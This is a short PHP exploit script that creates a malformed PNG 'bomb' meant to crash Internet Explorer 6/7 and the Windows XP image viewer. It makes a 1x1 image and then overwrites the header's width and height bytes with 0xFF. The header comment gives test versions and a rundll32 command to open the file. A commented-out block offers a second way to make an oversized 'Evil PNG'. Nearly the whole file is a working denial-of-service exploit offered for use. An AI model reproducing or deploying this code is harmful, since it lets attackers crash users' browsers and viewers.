<?php
/* By Crash - DataCha0s 
PNG Bomb Creator -   
Execute the CrashIE image without image editor, run in IE or Windows Image Viewer
Tested in XP Pro - SP2 IE: 6.0.29 and IE: 7
Interpreted whith PHP 5
run: php xplIEpng.php
Tip: This script run with GD2 5.1.4.4 to create a png file
windows Imagen Viewer: rundll32.exe C:\WINDOWS\system32\shimgvw.dll,ImageView_Fullscreen
*/

$i=0;
$png="CrashIE.png";
$img = imagecreate(1,1);
imagecolorallocate($img,255,255,255);
imagepng($img,"$png");
imagedestroy($img);
$o= fopen($png,"r+");
$c = array(18,19,22,23); 
while($i<=3){	
	fseek($o,$c[$i]); // Set the pointer in exact place 
	fwrite($o,"\xFF"); // Change the img size to 65535

	$i = $i + 1;
}
fclose($open);
Echo "By Crash - DataCha0s - crashbrz@gmail.com"; 

/* This code too make a Evil PNG
$png="CrashIE.png";
$img = imagecreate(65535,65535);
imagecolorallocate($img,255,255,255);
imagepng($img,"$png");
imagedestroy($img);
*/
?>